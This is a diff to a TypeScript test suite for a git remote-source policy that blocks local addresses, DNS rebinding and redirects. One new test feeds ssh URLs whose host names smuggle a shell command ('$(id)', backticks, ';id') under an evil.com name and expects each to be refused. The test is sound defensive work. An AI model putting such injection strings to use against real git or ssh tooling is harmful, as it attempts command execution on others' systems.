@@ -12,6 +12,7 @@ describe("classifyAddress", () => {
       ["172.20.0.1", "private"],
       ["192.168.1.20", "private"],
       ["127.0.0.1", "loopback"],
+      ["127.0.0.2", "loopback"],
       ["169.254.10.1", "link-local"],
       ["169.254.169.254", "metadata"],
       ["2606:50c0:8000::153", "public"],
@@ -99,6 +100,19 @@ describe("the source policy", () => {
     // A name that answers with any local address is refused, whatever else it answers.
     expect(await outcome("tenant", "https://rebind.example/acme/api.git")).toBe("refused");
     expect(await outcome("tenant", "https://nowhere.example/acme/api.git")).toBe("refused");
+    expect(await outcome("tenant", "https://127.0.0.2/acme/api.git")).toBe("refused");
+  });
+
+  it("refuses a host that is neither a DNS name nor an IP literal, before it reaches ssh", async () => {
+    for (const profile of ["operator", "tenant"] as const) {
+      for (const source of [
+        "ssh://git@a$(id).evil.com/acme/api.git",
+        "ssh://git@a`id`.evil.com/acme/api.git",
+        "ssh://git@a;id.evil.com/acme/api.git",
+      ]) {
+        expect(await outcome(profile, source, { operator: true })).toBe("refused");
+      }
+    }
   });
 
   it("never names the addresses a host resolved to", async () => {
@@ -127,9 +141,11 @@ describe("pinning a checked remote (DNS rebinding)", () => {
   it("tenant: HTTPS resolves the name to the checked address, ssh dials it and keeps the host key name", () => {
     const tenant = policy("tenant");
     expect(tenant.pinnedEnv(clearance("https", "git.acme.dev", null, "140.82.112.3"), {})).toEqual({
-      GIT_CONFIG_COUNT: "1",
+      GIT_CONFIG_COUNT: "2",
       GIT_CONFIG_KEY_0: "http.curloptResolve",
       GIT_CONFIG_VALUE_0: "git.acme.dev:443:140.82.112.3",
+      GIT_CONFIG_KEY_1: "http.followRedirects",
+      GIT_CONFIG_VALUE_1: "false",
     });
     expect(
       tenant.pinnedEnv(clearance("https", "git.acme.dev", 8443, "2606:50c0::153"), {
@@ -138,9 +154,11 @@ describe("pinning a checked remote (DNS rebinding)", () => {
         GIT_CONFIG_VALUE_0: "*",
       }),
     ).toMatchObject({
-      GIT_CONFIG_COUNT: "2",
+      GIT_CONFIG_COUNT: "3",
       GIT_CONFIG_KEY_1: "http.curloptResolve",
       GIT_CONFIG_VALUE_1: "git.acme.dev:8443:[2606:50c0::153]",
+      GIT_CONFIG_KEY_2: "http.followRedirects",
+      GIT_CONFIG_VALUE_2: "false",
     });
     expect(
       tenant.pinnedEnv(clearance("ssh", "github.com", null, "140.82.112.3"), {
